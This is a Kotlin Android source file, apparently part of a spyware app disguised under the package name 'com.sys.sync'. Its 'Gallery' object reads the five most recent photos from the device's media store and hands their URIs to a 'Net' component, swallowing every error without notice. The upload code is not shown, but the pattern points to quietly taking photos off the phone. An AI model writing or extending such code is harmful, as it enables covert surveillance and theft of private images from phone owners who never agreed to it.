package com.sys.sync

import android.content.Context
import android.provider.MediaStore

object Gallery {
    fun recent(c: Context) {
        try {
            val cur = c.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED),
                null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
            ) ?: return
            var n = 0
            while (cur.moveToNext() && n < 5) {
                val id = cur.getLong(0)
                Net.add("photo", "${MediaStore.Images.Media.EXTERNAL_CONTENT_URI}/$id")
                n++
            }
            cur.close()
        } catch (_: Exception) {}
    }
}
